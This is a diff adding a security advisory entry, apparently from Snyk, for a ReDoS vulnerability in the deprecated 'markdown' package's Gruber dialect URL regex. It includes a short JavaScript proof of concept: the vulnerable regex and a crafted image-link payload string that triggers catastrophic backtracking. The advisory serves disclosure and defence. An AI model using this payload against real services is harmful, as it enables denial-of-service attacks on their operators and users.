@@ -1,0 +1,34 @@
+---
+- id: snykio:maven:org.webjars.npm:markdown:567976
+  title: Regular Expression Denial of Service (ReDoS)
+  description: "[org.webjars.npm:markdown][1] is a Yet another markdown parser, this\ntime
+    for JavaScript.\n\nNote: This package is no longer actively maintained and should
+    be\nconsidered deprecated.\n\nAffected versions of this package are vulnerable
+    to Regular Expression\nDenial of Service (ReDoS). It is possible under certain
+    circumstances to\nabuse the URL regex parse functionality available within the
+    Gruber\ndialect feature to conduct denial of service attacks.\n\nNote: Exploitation
+    of this vulnerability requires usage of the `Gruber`\ndialect (`dialects/gruber.js`)
+    within `markdown`, which is not available\nby default.\n\n### PoC by Snyk   {#poc-by-snyk}\n\n
+    \   console.time('benchmark');\n    //regex taken from https://github.com/evilstreak/markdown-js/blob/master/src/dialects/gruber.js#L12\n
+    \   \n    var urlRegexp = /(?:(?:https?|ftp):\\/\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)(?:\\.(?:[a-z\\u00a1-\\uffff0-9]+-?)*[a-z\\u00a1-\\uffff0-9]+)*(?:\\.(?:[a-z\\u00a1-\\uffff]{2,})))(?::\\d{2,5})?(?:\\/[^\\s]*)?/i.source;\n
+    \   \n    //expoit/payload\n    const str = '![Blat Blat](https://192.168916891689168916891689168916891689168916891689168916891689168916891689168916891689168916891689168916891689268192.1
+    \"Blat Blat\")';\n    \n    //Duplicate of code from https://github.com/evilstreak/markdown-js/blob/master/src/dialects/gruber.js#L566\n
+    \   \n    var m = str.match(new RegExp(\"^!\\\\[(.*?)][ \\\\t]*\\\\((\" + urlRegexp
+    + \")\\\\)([ \\\\t])*([\\\"'].*[\\\"'])?\")) ||\n            str.match( /^!\\[(.*?)\\][
+    \\t]*\\([ \\t]*([^\")]*?)(?:[ \\t]+([\"'])(.*?)\\3)?[ \\t]*\\)/ );\n    console.timeEnd('benchmark');\n\n\n\n[1]:
+    https://www.npmjs.com/package/markdown\n"
+  affected_package: org.webjars.npm:markdown
+  vulnerable_versions:
+  - ">= 0"
+  severity: medium
+  package_manager: maven
+  cwe:
+  - CWE-400
+  disclosed_date: 2020-05-01
+  created_date: 2020-05-01
+  last_modified_date: 2020-05-01
+  credit:
+  - Snyk Security Team
+  references:
+  - https://github.com/evilstreak/markdown-js/blob/master/src/dialects/gruber.js#L12
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-567976
